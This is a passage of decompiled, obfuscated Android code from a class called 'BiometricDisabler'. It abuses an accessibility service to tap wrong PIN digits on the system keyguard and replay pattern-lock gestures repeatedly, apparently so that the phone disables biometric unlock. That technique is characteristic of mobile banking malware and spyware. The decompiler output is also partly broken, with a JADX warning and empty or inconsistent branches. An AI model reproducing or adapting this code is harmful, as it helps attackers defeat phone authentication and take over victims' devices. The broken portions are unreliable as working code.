                    biometricDisabler$executePatternGesture$1.f52745a0 = c0317a22;
                    biometricDisabler$executePatternGesture$1.f52746a1 = path2;
                    biometricDisabler$executePatternGesture$1.f52747a2 = i2;
                    biometricDisabler$executePatternGesture$1.f52750a5 = 2;
                    if (b81.m210571b1(1000L, biometricDisabler$executePatternGesture$1) != coroutineSingletons) {
                        path = path2;
                        i = i2 + 1;
                        c0317a2 = c0317a22;
                        if (i < 14) {
                            t60.m214714d6("BiometricDisabler", "✅ 图案锁执行完成，共 13 次");
                            return c1351vv;
                        }
                    }
                }
                return coroutineSingletons;
            }
        }
    }

    /* renamed from: b1 */
    public final AccessibilityNodeInfo m211563b1(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM211563b1;
        try {
            Pair pairM213572b9 = kj1.m213572b9(this.f53042a1);
            int iIntValue = ((Number) pairM213572b9.f57556a0).intValue();
            int iIntValue2 = ((Number) pairM213572b9.f57557a1).intValue();
            float f = iIntValue * 0.5f;
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            int iWidth = rect.width();
            int iHeight = rect.height();
            float f2 = iWidth;
            if (f2 > f) {
                float f3 = iHeight;
                if (f3 > f) {
                    float f4 = f2 / f3;
                    if (0.7f <= f4 && f4 <= 1.3f) {
                        float fCenterY = rect.centerY();
                        float f5 = iIntValue2;
                        if (fCenterY > 0.3f * f5 && fCenterY < f5 * 0.8f) {
                            t60.m214702c3("BiometricDisabler", "🔍 找到候选图案锁区域: " + rect + ", ratio=" + f4);
                            return accessibilityNodeInfo;
                        }
                    }
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null && (accessibilityNodeInfoM211563b1 = m211563b1(child)) != null) {
                    return accessibilityNodeInfoM211563b1;
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:24:0x0056  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00bc  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:42:0x00b7 -> B:44:0x00ba). Please report as a decompilation issue!!! */
    /* renamed from: b5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211564b5(ContinuationImpl continuationImpl) throws Throwable {
        BiometricDisabler$inputWrongPin$1 biometricDisabler$inputWrongPin$1;
        AccessibilityNodeInfo rootInActiveWindow;
        C0317a2 c0317a2;
        String[] strArr;
        int i;
        if (continuationImpl instanceof BiometricDisabler$inputWrongPin$1) {
            biometricDisabler$inputWrongPin$1 = (BiometricDisabler$inputWrongPin$1) continuationImpl;
            int i2 = biometricDisabler$inputWrongPin$1.f52762a6;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                biometricDisabler$inputWrongPin$1.f52762a6 = i2 - Integer.MIN_VALUE;
            } else {
                biometricDisabler$inputWrongPin$1 = new BiometricDisabler$inputWrongPin$1(this, continuationImpl);
            }
        }
        Object obj = biometricDisabler$inputWrongPin$1.f52760a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = biometricDisabler$inputWrongPin$1.f52762a6;
        try {
            try {
            } catch (Throwable th) {
                if (rootInActiveWindow != null) {
                    try {
                        rootInActiveWindow.recycle();
                    } catch (Exception unused) {
                    }
                }
                throw th;
            }
        } catch (Exception e) {
            t60.m214705c6("BiometricDisabler", "输入PIN失败", e);
            if (rootInActiveWindow != null) {
            }
        }
        if (i3 == 0) {
            kg1.m213544f4(obj);
            rootInActiveWindow = this.f53041a0.getRootInActiveWindow();
            c0317a2 = this;
            strArr = new String[]{"com.android.systemui:id/key", "com.android.keyguard:id/key"};
            i = 1;
            if (i < 7) {
            }
        } else {
            if (i3 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i = biometricDisabler$inputWrongPin$1.f52759a3;
            strArr = biometricDisabler$inputWrongPin$1.f52758a2;
            rootInActiveWindow = biometricDisabler$inputWrongPin$1.f52757a1;
            c0317a2 = biometricDisabler$inputWrongPin$1.f52756a0;
            kg1.m213544f4(obj);
            i++;
            if (i < 7) {
                boolean z = false;
                if (rootInActiveWindow != null) {
                    int length = strArr.length;
                    int i4 = 0;
                    while (true) {
                        if (i4 >= length) {
                            break;
                        }
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(strArr[i4] + i);
                        if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                            AccessibilityNodeInfo accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId.get(0);
                            t60.m214694b5(accessibilityNodeInfo, "nodes[0]");
                            c0317a2.m211559a5(accessibilityNodeInfo);
                            z = true;
                            break;
                        }
                        i4++;
                    }
                }
                if (!z && rootInActiveWindow != null) {
                    String strValueOf = String.valueOf(i);
                    c0317a2.getClass();
                    AccessibilityNodeInfo accessibilityNodeInfoM211557b3 = m211557b3(rootInActiveWindow, strValueOf);
                    if (accessibilityNodeInfoM211557b3 != null) {
                        c0317a2.m211559a5(accessibilityNodeInfoM211557b3);
                        z = true;
                    }
                }
                if (!z) {
                    c0317a2.m211560a6(i);
                }
                biometricDisabler$inputWrongPin$1.f52756a0 = c0317a2;
                biometricDisabler$inputWrongPin$1.f52757a1 = rootInActiveWindow;
                biometricDisabler$inputWrongPin$1.f52758a2 = strArr;
                biometricDisabler$inputWrongPin$1.f52759a3 = i;
                biometricDisabler$inputWrongPin$1.f52762a6 = 1;
                if (b81.m210571b1(200L, biometricDisabler$inputWrongPin$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                i++;
                if (i < 7) {
                    if (rootInActiveWindow != null) {
                        try {
                            rootInActiveWindow.recycle();
                        } catch (Exception unused2) {
                        }
                    }
                    return C1351vv.f60710b1;
                }
            }
        }
    }

    /* renamed from: b6 */
    public final void m211565b6(float f, float f2) {
        try {
            Path path = new Path();
            path.moveTo(f, f2);
            this.f53041a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 50L)).build(), null, null);
        } catch (Exception e) {
            t60.m214705c6("BiometricDisabler", "点击手势失败", e);
        }
    }
}
